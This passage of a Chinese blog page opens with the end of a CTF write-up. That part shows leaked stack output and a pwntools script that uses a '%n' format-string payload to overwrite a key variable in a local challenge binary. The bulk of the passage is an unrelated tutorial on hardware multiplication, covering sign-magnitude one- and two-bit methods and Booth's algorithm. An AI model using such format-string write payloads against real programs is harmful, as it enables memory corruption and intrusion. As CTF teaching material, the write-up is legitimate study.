class="line">AAAA-0xf7f5ace0-0xff8a6a84-(nil)-0x1-0x80483a0-0xff8a6a28-0x80484e7-0xff8a6820-0x200-0xf7f2b580-(nil)-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>

<p><code>0x41414141</code>是栈上第12个参数,现在可以用key的地址<code>0x804A048</code>替代<code>AAAA</code>,然后用<code>payload=p32(0x0804A048)+(&#39;%035795742c%12$n&#39;).encode()</code>将<code>4+035795742</code>写到第12个参数上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x0804A048</span>)+(<span class="string">&#x27;%035795742c%16$n&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<p>运行之后终端上会输出<code>035795746</code>个空格,需要等好长好长时间,才轮到我们与终端交互</p>
<p>有没有温柔一些的方法呢?</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">机器级算术运算的原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-17 12:20:00 / Modified: 12:24:34" itemprop="dateCreated datePublished" datetime="2022-06-17T12:20:00+08:00">2022-06-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="机器级算术运算的原理"><a href="#机器级算术运算的原理" class="headerlink" title="机器级算术运算的原理"></a>机器级算术运算的原理</h1><p>落脚在加法,全加器,半加器,全加器级联,等最基础的知识</p>
<p>机器在算术的时候有很多行为和人不一样,但是权位的思想是相同的</p>
<p>人在算术的时候通过列竖式对其的方式,隐含着权位规则.</p>
<p><strong>机器将权位规则体现在,随着运算会有中间结果的位移</strong></p>
<p>理解了机器将中间结果移位的原因,也就理解了机器级算术运算的原理</p>
<p>计组第三章讲的机器机计算方法实际上和程序员距离比较远,ALU中已经封装好了各种计算方法,那为什么还要我们学这一部分呢?</p>
<p>我的感觉让我们是理解计算机底层实现中的状态机思想,</p>
<p>在推导适应机器的算法时,越发感觉出,有固定的状态的转移套路</p>
<p>而这种思想将对我们在开发状态机服务端的时候提供世界观上的支持</p>
<p>然而课本对于该部分的介绍基本止步于如何计算,并没有下到算法如何设计得到的,可以说是一大遗憾.</p>
<p>现在将我的设计和课本给出的设计思想其补上</p>
<h2 id="手算原码乘法"><a href="#手算原码乘法" class="headerlink" title="手算原码乘法"></a>手算原码乘法</h2><p>这是万恶之源,通过一个例题观察人类对权位规则的应用</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617122401353.png" alt="image-20220617122401353"></p>
<p>之前一直不知道怎么描述这个过程,只能是手写比划比划,直到看了CSAPP第二章位向量表示法,终于知道怎么描述这个过程了</p>
<p>只看小数点后面的部分,把$X,Y$表示成位向量,有<br>$$<br>X&#x3D;[X_3X_2X_1X_0]&#x3D;\sum_{i&#x3D;0}^3[2^i\times X_i](X_i&#x3D;0\ or\ 1)<br>$$</p>
<p>$$<br>Y&#x3D;[Y_3Y_2Y_1Y_0]&#x3D;\sum_{i&#x3D;0}^3[2^i\times Y_i](Y_i&#x3D;0\ or\ 1)<br>$$</p>
<p>那么手算的思想可以用下式表示:<br>$$<br>\begin{aligned}<br>ANS&amp;&#x3D;X\times Y\<br>&amp;&#x3D;X\times\sum_{i&#x3D;0}^3[2^i\times Y_i]\<br>&amp;&#x3D;\sum_{i&#x3D;0}^3[ 2^i\times X\times Y_i]\<br>&amp;&#x3D;[X\times Y_0]+2[X\times Y_1]+4[X\times Y_2]+8[X\times Y_3]\<br>&amp;&#x3D;A_0+A_1+A_2+A_3\<br>&amp;&#x3D;E\<br>&amp;&#x3D;[E_3E_2E_1E_0]<br>\end{aligned}<br>$$<br>其中<br>$$<br>A_i&#x3D;2^i\times [X\times Y_i],i\in[0,3]<br>$$</p>
<p>$$<br>E_j&#x3D;\sum_{i&#x3D;0}^3A_{ij}+低位进位\<br>j\in[0,7]\<br>$$<br><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616210922544.png" alt="image-20220616210922544"></p>
<p>这里$E_i$的计算方法就是小学里算竖式的时候,老师常说的”落下来”</p>
<p>从图上我们可以更清晰地看出,被乘数分别和乘数的”个十百千位”相乘,按位对其之后落下来累加得到E</p>
<h2 id="原码一位乘法"><a href="#原码一位乘法" class="headerlink" title="原码一位乘法"></a>原码一位乘法</h2><p>如果让机器原封不动重复刚才手算的过程</p>
<h3 id="替机器瞎操心"><a href="#替机器瞎操心" class="headerlink" title="替机器瞎操心"></a>替机器瞎操心</h3><p>他需要维护一个二维数组,记录用X和Y的每一位相乘,分别得到的中间位向量$A_i$</p>
<p>然后”落下来”求$E$</p>
<p>就这个二维数组就把机器难为住了</p>
<p>1.如果两个32位整数相乘,就需要32*32个方格的二维数组,ALU可是没有记忆功能的,寄存器也就稀松几个,记忆能力有限,显然32²个方格没处放.</p>
<p>2.机器怎么知道当前应该用X对齐Y的”个位”还是”十位”还是”百位”呢?用一个寄存器,记录Y已经被对齐过几位吗?</p>
<p>不需要,因为本次对齐的位一定是只比上一次对齐位高一位,只需要将被乘数左移一下.</p>
<p>然后根据本次Y的对齐位是1则$Ai&#x3D;X\times 权重$,比如图表中$A_3$</p>
<p>如果本次Y的对齐位为0则$A_i&#x3D;0$,比如图表中$A_2$</p>
<p>问题又来了,权重用谁来记住呢?再开一个寄存器,初始记录1,表示权重为$2^0$,随着被乘数$X$的左移,这个寄存器也要左移一下表示权重乘以2</p>
<p>如果继续研究如何让硬件实现,还能发现更多问题.<del>第一,机器算账,这钱怎么进了你自己的腰包</del></p>
<h3 id="滚动数组"><a href="#滚动数组" class="headerlink" title="滚动数组"></a>滚动数组</h3><p>现在考虑一下,有必要维护这个二维数组吗?滚动数组行吗?</p>
<p>中间过程不使用二维数组,就维护一个位向量$A$,计算过程中A只有累加和右移两种行为.</p>
<p>乘数个位为1,则被乘数直接加到A的<strong>高四位</strong></p>
<blockquote>
<p>为啥是高四位呢?似乎有点违反直觉,因为A的高位表示的是高权重,但是现在用被乘数乘的是乘数的个位,权位最低才对啊.别忘了A要右移</p>
</blockquote>
<p>然后A右移一位,乘数右移一位</p>
<blockquote>
<p>这个过程干了一个啥事呢?</p>
<p>被乘数一直和乘数的”最低位”对齐,刚才最低位是”个位”,现在经过右移,个位直接扬了,十位成了”最低位”.被乘数时钟看乘数最低位脸色行事,当这个最低位是1的时候才把自己加到A上,加到A的最高四位上</p>
<p>A右移一位,则所有历史记录都降权2,</p>
<p>可想而知,当乘数的千位右移到最低位,这时候被乘数将自己加到了A的高四位上,此时计算结束.乘数的千位和被乘数的积 的权就最高,根本不需要降权</p>
<p>而乘数的个位和被乘数的积此时已经经历了4次降权,权重仅为$\frac{1}{2^4}&#x3D;\frac{1}{16}$</p>
<p>这正好满足我们的目的</p>
</blockquote>
<p>现在可以用机器实现了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213145320.png" alt="image-20220616213145320"></p>
<h4 id="硬件框图的意义"><a href="#硬件框图的意义" class="headerlink" title="硬件框图的意义"></a>硬件框图的意义</h4><p>这个图怎么看呢?</p>
<p>D和A合起来作为”中间过程位向量”,D就是高四位,A就是低四位</p>
<p>一开始的时候D&#x3D;0,A&#x3D;Y,这好像和我们刚才的分析不一样,我们分析的滚动数组思想中,Y是独立存在的,不会放在A中.</p>
<p>而实际上Y需要独立存在吗?考虑每次被乘数要么不加,要么加到高四位上,而Y一开始放在低四位,两者不会相互影响.</p>
<p>随着这个中间过程位向量不断右移,Y被一位一位移除了A,当Y恰好移出的时候计算恰好结束.</p>
<p>$A_0$就是乘数的”最低位”,随着乘数Y的不断右移,硬件A的最低位会以此存放Y的个十百千位,相当于将Y遍历了一遍</p>
<p>“被乘数看乘数最低位颜色决定加不加”这个事怎么实现的呢?</p>
<p>用一个B寄存器存放被加数X,X和0作为二选一选择器的数据段,$A_0$作为该二选一的地址端,当$A_0&#x3D;1$则选通X,当$A_0&#x3D;0$则选通0</p>
<p>选通的信号就进入了$\Sigma$多位加法器</p>
<p>左上角这个循环干了啥事呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213859376.png" alt="image-20220616213859376"></p>
<p>被加数总是加到中间过程位向量的高四位,这怎么实现?将旧的高四位作为加数和X相加就得到了新的高四位</p>
<p>这个半调子CF是干啥的呢?</p>
<p>CF是PSW程序状态字中的一位,用来记录是否有进位,啥时候会有进位呢?</p>
<p>比如头一次D&#x3D;1111,右移变成0111,然后下一次又加了1111,显然0111+1111溢出了,但是顶多溢出一位,于是放到CF里,然后D右移的时候,再从CF里拿出来放到D里</p>
<h3 id="手写模拟"><a href="#手写模拟" class="headerlink" title="手写模拟"></a>手写模拟</h3><p>模拟机器计算$0.1101\times 1.1011$(都是原码)</p>
<p>符号显然同号得负数,这对机器来说也是小菜一碟,两符号娶个异或即可</p>
<p>去掉小数点,后面的直接作为整数乘法,怎么乘的呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616215950459.png" alt="image-20220616215950459"></p>
<p>最左侧这里列也是有实际意义的,里面是CF位的状态.</p>
<p>这一点课本并没有给出,这导致我一开始认为只有手算模拟才会用到这一列</p>
<p>乘数有四位,因此共有四次操作,恰好将Y从A中扬了,中间结果积逐渐充斥整个D和A</p>
<blockquote>
<p>这个过程要是找个现实中的类比的话,可以举这么一个不恰当的例子:</p>
<p>一个公司有10个部长,资本家的总是嫌这十个人好吃懒惰不干活,或者说即使比较勤奋,但是不想再给他发太多工资,直接降薪吧人家也不愿意.反正就是想找个理由踢了这是个人换成新人</p>
<p>但是资本家还不敢一口气全体了,这会造成一段时间没人管事儿.</p>
<p>于是资本家想了一个温水煮癞蛤蟆的方法,每隔一个月从这10个人里找一个业绩最差的,</p>
<p>要是他真的好吃懒惰啥也不干,直接踢了,公司正常运转.</p>
<p>要是他确实负责一些事情,那么找一个能干的新人把他挤了,公司正常运转</p>
<p>10个月后,10个部长就全是优秀并且高效的00后了</p>
</blockquote>
<h4 id="无符号右移"><a href="#无符号右移" class="headerlink" title="无符号右移?"></a>无符号右移?</h4><p>关于”无符号右移”,这个事情发生在</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616220805565.png" alt="image-20220616220805565"></p>
<table>
<thead>
<tr>
<th>原数</th>
<th>带符号右移结果</th>
<th>无符号右移结果</th>
</tr>
</thead>
<tbody><tr>
<td>$1’0011’1101$</td>
<td>$1’1001’1110$</td>
<td>$0’1001’1110$</td>
</tr>
</tbody></table>
<p>显然正确的计算方法是无符号右移,为啥不是带符号的呢?</p>
<p>首先,带符号意味着负数,而我们整个计算过程中要么加0,要么加x,反正不会加一个负数,理论上就不存在加负数的情况</p>
<p>再者,这里最左侧的”符号”实际上是CF位,是上一次加被乘数之后的进位,不是”符号”,我们一直在进行无符号运算</p>
<h2 id="原码两位乘法"><a href="#原码两位乘法" class="headerlink" title="原码两位乘法"></a>原码两位乘法</h2><h3 id="为啥要两位乘"><a href="#为啥要两位乘" class="headerlink" title="为啥要两位乘?"></a>为啥要两位乘?</h3><p>原码两位乘法和原码一位乘法的思想基本相同,但是设计硬件的那伙子人嫌一位乘法太慢,这就好比一个人上楼梯,每次上一个台阶嫌慢,非得上两个</p>
<p>为啥没有原码三位乘法?<del>一次上三个台阶这不扯蛋吗</del></p>
<p>因为计算机中的数据都占用偶数位,从来没有说有一个66位计算机,有一个63位计算机,有一个30位计算机.</p>
<p>实际存在的计算机都是64位,32位,这些位数都是2的幂次,为啥非要是2的幂次?方便使用二进制呗.为啥一定使用二进制?逻辑门高电位和低电位就两种状态呗</p>
<p>为啥没有原码四位乘法?32和64不也是4的倍数吗?</p>
<p>还要考虑一个复杂性问题</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616230513076.png" alt="image-20220616230513076"></p>
<p>如图原码二位乘已经有$2^3&#x3D;8$种情况了,要是原码四位乘,不考虑低位进位的情况至少这四位需要考虑,就已经有$2^4&#x3D;16$种情况了,显然让ALU考虑多种情况也是需要记忆功能的</p>
<p>在记忆能力和速度都可以接收的范围内,只有原码一位乘和原码二位乘是可行的</p>
<h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>两位乘怎么玩呢?</p>
<p>原来被乘数看乘数最低位的脸色行事,现在被乘数还要看次低位的脸色.真的太卑微了</p>
<p>最低位和次低位的权还不一样,次低位更狠,权更重.</p>
<p>为了更详细的描述这个意思,规定X和Y的位向量表示</p>
<p>X和Y都忽略小数点和符号位,小数点后面的直接作为一个整数</p>
<p>$X&#x3D;X_3X_2X_1X_0$</p>
<p>$Y&#x3D;Y_3Y_2Y_1Y_0$</p>
<p>现在最低位就是$Y_0$,次低位就是$Y_1$,随着Y不断右移,这两个位会遍历整个Y</p>
<p>当$Y_1Y_0&#x3D;11&#x3D;3(Dec)$需要向中间过程位向量上加三个被乘数X,</p>
<p>当$Y_1Y_0&#x3D;10&#x3D;2(Dec)$需要向中间过程位向量上加两个被乘数X</p>
<p>当$Y_1Y_0&#x3D;01&#x3D;1(Dec)$需要向中间过程位向量上加一个被乘数X</p>
<p>当$Y_1Y_0&#x3D;00&#x3D;0(Dec)$啥也不加</p>
<p>啥也不加,加一个X都好说,加两个X通过将X左移一位×2也容易实现,但是这个半吊子3怎么办呢?</p>
<p><code>3=4-1</code>,啥意思呢?</p>
<p>先从中间过程位向量的高四位减去一个被乘数X,</p>
<p>然后右移两位,这导致刚才减去的X降权4(右移两位相当于除以4),</p>
<p>此时再向高四位加上一个被乘数X,这个刚加上的X的权就高,是刚才减去的X的四倍,</p>
<p>这样一减一加,相当于在上一步(刚才减一的那一步)往中间过程位向量上加上了3个X.</p>
<p>达到了我们的目的</p>
<p>当$Y_1Y_0&#x3D;11$,这时候才会加3X,还有加2X,1X,0的时候,怎么区分多种状态呢?用一个flag开关</p>
<p>也就是下表中的C</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616231945745.png" alt="image-20220616231945745"></p>
<p>这个表什么意思呢?</p>
<h4 id="我一开始的理解"><a href="#我一开始的理解" class="headerlink" title="我一开始的理解"></a>我一开始的理解</h4><p><strong>(当然是错误的,但是有借鉴意义)</strong></p>
<p>刚才我们推导怎么实现加3X的时候,先减X,位移后再加上X,看上去顺理成章,确实解决了上一回合需要加3X这个问题,</p>
<p>但是同时引入了新问题,即</p>
<p><strong>位移后的本回合有本回合要做的事情,而你却在本回合处理了上回合要做的事情,那么本回合本来要做的事情啥时候做呢?</strong></p>
<blockquote>
<p>啥叫本回合应该做的事?</p>
<p>每个回合要做的事就是根据<strong>当前</strong>乘数最低两位的脸色决定往中间过程位向量上加几个X</p>
</blockquote>
<p>要么本回合开一个额外回合,在给上回合擦腚之后,先不忙着将乘数右移开启下一个回合,而是正式处理本回合的事.处理完了再右移开启下一回合</p>
<p>但是这样怎么让一个傻子CPU知道这一次有没有额外回合呢?</p>
<p>可以用标志位C.每个正式回合都根据乘数最低两位是否全1,设置C是否为1,</p>
<p>当回合开始的时候,让CPU先检查C开关是否打开,</p>
<p>​	如果开着则先擦腚,然后C给他关上,</p>
<p>​	如果C关着(不管是本来就管着还是擦完腚关上的,一视同仁),则处理本回合事物</p>
<p>我确实一开始是这样想的,但是仔细观察法则表之后发现人家的想法和我不一样</p>
<h4 id="人家的想法"><a href="#人家的想法" class="headerlink" title="人家的想法"></a><strong>人家的想法</strong></h4><p>如果按照我的设想,当C为1的时候,不需要看$Y_1Y_0$的脸色,直接加X,然后C置零</p>
<p><strong>然而</strong>表中即使C为1也需要看$Y_{i+1}Y_{i}$的脸色</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233254740.png" alt="image-20220616233254740"></p>
<p>那么人家的方法什么思想呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233344339.png" alt="image-20220616233344339"></p>
<p>这段文字十分滴珍贵,但是是那种懂的人一看就懂,不懂的看了还是不懂(此名言出自计组老师gx)</p>
<p>啥意思呢?不妨从研究这个表的结构规则入手</p>
<p>可以发现,</p>
<p>1.当$Y_{i+1}$固定时,$Y_i$和$C$具有对称结构,具体表现为:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233605441.png" alt="image-20220616233605441"></p>
<p>2.$Y_i$和$C$联手的时候相当于$Y_{i+1}$<br><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233706177.png" alt="image-20220616233706177"></p>
<p>也就是说,$Y_i$和$C$就有完全相同的地位,$Y_{i+1}$权为2, $Y_i$权为1,$C$的权也是1</p>
<p>而这种类似的结构我们在什么地方见过呢?全加器</p>
<blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-9b6f89175b854c4c335a704982d3520f_r.jpg" alt="一位全加器真值表"></p>
<p>全加器中$X,Y,C_{i-1}$三者具有轮换对称结构</p>
<p>而$C_{i-1}$表示的是低位向本位的进位开关,类比到原码两位乘法中,他就是低位计算时没擦干净的屁股</p>
<p>在这个全加器运算的时候,会同时考虑三路输入,将$X_i,Y_i,C_{i-1}$同时加起来,也就是在完成本回合的事物时,同时把上回合的屁股擦了</p>
<p>但是也可以设计成,$X_i+Y_i$先算好,然后将上回合的屁股$C_{i-1}$加上</p>
<p>设计固然可以这样设计,但是何必呢?算好的结果还需要保存一下然后才和$C_{i-1}$相加.</p>
<p>直接三个加起来不用保存中间结果并且更容易实现,岂不美哉</p>
</blockquote>
<p>就用全加器的思想考虑在原码两位乘法</p>
<p>C不也是低位向本位的进位吗?或者说,上一个回合留到本回合才能擦干净的屁股</p>
<p>在上个回合加4X,不就相当于在本回合加X吗?</p>
<p>处理上回合的屁股顶多在本回合加一个X,</p>
<p>要是本回合本来啥也不干,那么处理屁股,加上X就完了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235501743.png" alt="image-20220616235501743"></p>
<p>要是本回合本来就应该加X,那么一块处理了,加上2X就完了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235511820.png" alt="image-20220616235511820"></p>
<p>要是本回合本来应该加2X,加上屁股一个X,一共3X,只需要减一个X然后继续把屁股交给下一个回合</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235623070.png" alt="image-20220616235623070"></p>
<p>要是本回合本来应该加3X,加上屁股一共四个X,可以加上左移两次的X,但是留一个屁股给下一回合加上也是相当于本回合加4X,还不用位移,岂不美哉</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235634096.png" alt="image-20220616235634096"></p>
<p>如果上个回合没有留屁股(即C&#x3D;0),则本回合只需要看$Y_1Y_0$脸色行事,不用擦屁股</p>
<p>如此这个法则表就不用死记硬背了</p>
<h4 id="手写模拟-1"><a href="#手写模拟-1" class="headerlink" title="手写模拟"></a>手写模拟</h4><p>$X&#x3D;+0.100111,Y&#x3D;-0.100111$用原码两位乘法求积</p>
<p>符号显然为1</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235859593.png" alt="image-20220616235859593"></p>
<p>这个”符号位”是啥呢?</p>
<p>这确实是符号位,因为过程中有$-X$的行为.为啥要三个符号位呢?这个是人为规定的</p>
<p>因为两位乘每回合需要右移两位,那么符号位至少有两位,至于为什么是三位呢?</p>
<p>因为<strong>存在带符号右移</strong>的行为,右移两位之后符号位高两位是填充0呢还是填充1呢?</p>
<p>能不能全都填充0呢?诚如是则三个符号位都是摆设,编课本的人也不用编了.多此一举何必呢?</p>
<p>这符号位的最高位起一个提示的作用,如果最高位为1则右移的时候最高位也补1,否则补0</p>
<p>因此最高位完全是个人爱好添加的,因为只要是最高位是1,则符号位的第二位也是1,完全可以根据第二位的提示填充符号位的高两位</p>
<p>这里就有问题了,为什么会有带符号右移?原码一位乘法的时候明明没有带符号右移啊?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617000021929.png" alt="image-20220617000021929"></p>
<p>因为过程中确实有$-X$这种行为,通过加补实现,而补码的符号位就是负数.</p>
<p>如果无符号右移,则本回合$-X$在右移后进入下回合时,符号位也跟着移到右侧,这个$-X$成了加一个数,失去减法的意义并且导致错误</p>
<h2 id="补码一位乘法–布斯法"><a href="#补码一位乘法–布斯法" class="headerlink" title="补码一位乘法–布斯法"></a>补码一位乘法–布斯法</h2><h3 id="推导算法原理"><a href="#推导算法原理" class="headerlink" title="推导算法原理"></a>推导算法原理</h3><p>令$X&#x3D;X_0.X_{-1}X_{-2}…X_{-(n-1)}$,$Y&#x3D;Y_0.Y_{-1}Y_{-2}…Y_{-(n-1)}$</p>
<p>将$Y$按照权位展开<br>$$<br>\begin{aligned}<br>Y&amp;&#x3D;Y_0.Y_{-1}Y_{-2}…Y_{-(n-1)}\<br>&amp;&#x3D;Y_0\times 2^0+Y_{-1}\times 2^{-1}+Y_{-2}\times 2^{-2}+…+Y_{-(n-1)}\times 2^{-(n-1)}\<br>&amp;&#x3D;Y_0(2^1-2^0)+Y_{-1}\times(2^0-2^{-1})+Y_{-2}\times (2^{-1}-2^{-2})+…+Y_{-(n-1)}\times (2^{-(n-2)}-2^{-(n-1)})\<br>&amp;&#x3D;2Y_0+2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+…+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})<br>\end{aligned}<br>$$<br>其中$Y_0$是符号位,当$Y_0&#x3D;0$,$2Y_0&#x3D;0$,可以忽略</p>
<p>当$Y_1&#x3D;1$,$2Y_1&#x3D;10$进位不管,本位还是$0$,也可以忽略</p>
<p>那么$Y&#x3D;2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+…+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})$</p>
<p>不妨令$Y$最后再加一位$Y_{-n}&#x3D;0$反正小数部分最后添0不会影响小数大小</p>
<p>那么<br>$$<br>\begin{aligned}<br>Y&amp;&#x3D;2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+…+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(Y_{-n}-Y_{-(n-1)})\<br>&amp;&#x3D;\sum_{i&#x3D;-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)<br>\end{aligned}<br>$$<br>好了,现在$Y$经过各种调教,已经连同符号位都可以一起计算了<br>$$<br>\begin{aligned}<br>X\times Y&amp;&#x3D;X\times \sum_{i&#x3D;-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)\<br>&amp;&#x3D;\sum_{i&#x3D;-(n-1)}^{0}[2^{i}\times (Y_{i-1}-Y_i)\times X]<br>\end{aligned}<br>$$<br>这是一种啥形式呢?每次$X$都看$Y_{i-1}Y_{i}$的脸色行事,$2^i$是这俩哥们儿的权重.此时不再考虑$Y_{i-1},Y_{i}$的权重区别了,因为$2^i$是两个家伙的共同的权重,两者权重的二倍关系,已经应用在在刚才的转化过程中</p>
<table>
<thead>
<tr>
<th>$Y_{i-1}Y_{i}$</th>
<th>$Y_{i-1}-Y_{i}$</th>
<th>行为</th>
</tr>
</thead>
<tbody><tr>
<td>00</td>
<td>0</td>
<td>啥也不干</td>
</tr>
<tr>
<td>01</td>
<td>-1</td>
<td>-X</td>
</tr>
<tr>
<td>10</td>
<td>1</td>
<td>+X</td>
</tr>
<tr>
<td>11</td>
<td>0</td>
<td>啥也不干</td>
</tr>
</tbody></table>
<p>在一个回合内应该干的事情:</p>
<p>从$i&#x3D;-(n-1)$这个最低权位开始算,每次根据$Y$的最低两位确定行为,然后右移一位,将$Y_i$移出扬了,刚才的$Y_{i-1}$现在是最低位.</p>
<p>每个回合开始前,将上回合的中间过程位向量右移一位,作用是给先前的计算结果都降权2</p>
<h3 id="硬件实现"><a href="#硬件实现" class="headerlink" title="硬件实现"></a>硬件实现</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081422674.png" alt="image-20220617081422674"></p>
<p>这个图应该怎样理解呢?</p>
<p>D和A两个寄存器共同组成中间过程位向量,最右边有一个$A_{-1}$是附加位,这个刚才我们也分析过了,小数部分最后随便添0不影响结果大小</p>
<p>一开始的时候,乘数$Y$符号位和数值位都放在A中,小数点扬了,$Y$的最低位落到$A_0$,此时$A_{-1}&#x3D;0,D&#x3D;0$</p>
<p>右移的时候$A_{-1}$也要参与,刚才的$A_0$就移入$A_{-1}$,一共右移多少次呢?将A中的乘数刚好扬了为止,比如$Y&#x3D;1.0011$则右移5次(符号位和数值为没有区别)</p>
<p>$A_0A_{-1}$接入一个二四译码器,而实际上一共有三种情况,啥也不干,+X,-X,怎么把这三种情况转化成机器能听懂的语言呢?</p>
<p>当$A_0A_{-1}&#x3D;00$则选择器选通$D_0&#x3D;0$</p>
<p>当$A_0A_-1&#x3D;01$则选择器选通$D_1&#x3D;{B}$</p>
<p>当$A_0A_{-1}&#x3D;10$则选择器选通$D_2&#x3D;\overline {B}$,此时$A_0\overline A_{-1}$接入与门,与门接到全加器最低位,作用是对$B$的取反再+1得到补码</p>
<p>当$A_0A_{-1}&#x3D;11$则选择器选通$D_3&#x3D;0$</p>
<p>选通信号都输入全加器</p>
<p>中间过程位向量$[D:A]$在右移的时候带符号右移,即$CF$跟着移入最高位,并且右移之后$CF$状态不变</p>
<h3 id="手算模拟"><a href="#手算模拟" class="headerlink" title="手算模拟"></a>手算模拟</h3><p>$X&#x3D;0.1010,Y&#x3D;-0.1101$,计算两个数的补码一位布斯乘法</p>
<p>$[X]_补&#x3D;00.1010$</p>
<p>$[Y]_补&#x3D;11.0011$</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081351470.png" alt="image-20220617081351470"></p>
<p>最终没有特判符号位,而是符号位已经在CF中了</p>
<p>经过刚才的分析,现在$A_{-1}$就具有实际意义了,不再是一个根据人的意愿补上的一位了</p>
<p>每个回合,被乘数都根据$A_{0}A_{-1}$的脸色行事,比如当$A_0A_{-1}&#x3D;10$时,应该-X</p>
<p>而这似乎和我们一开始推导算法的时候相反</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617084040120.png" alt="image-20220617084040120"></p>
<p>我们推导的是当$Y_{i-1}Y_i&#x3D;10$时+X</p>
<p>实际上令i&#x3D;0得到$Y_{-1}Y_0&#x3D;10$调个个儿就得到$Y_0Y_{-1}&#x3D;01$</p>
<p>因此$A_{0}A_{-1}&#x3D;10$实际对应的是$Y_{i-1}Y_i&#x3D;01$的情况,行为是-X</p>
<p>这里一定要分清关系</p>
<blockquote>
<p>在手算模拟的时候,只需要用$A_{-1}-A_0$,根据结果的正负决定加减X,$A_{-1}-A_0&#x3D;1$则+X</p>
</blockquote>
<p>关于手算时符号位为啥要两位?</p>
<p>实际上机器只需要一位,这一位就有实际意义,即CF的值</p>
<p>然而由于计算过程中需要带符号右移一位,这样符号位是11时右移一位变成01,我们模拟时一看符号位还有1,于是高位填充1,修正成11</p>
<p>即最高位是防止人计算的过程中犯糊涂用的</p>
<p>并且符号位两位起到了双符号位判断溢出的作用,如果计算过程中,出现了两个符号位不同的情况,啃腚是算错了</p>
<h2 id="原码除法"><a href="#原码除法" class="headerlink" title="原码除法"></a>原码除法</h2><h3 id="手算"><a href="#手算" class="headerlink" title="手算"></a>手算</h3><p>约定规则</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617085630330.png" alt="image-20220617085630330"></p>
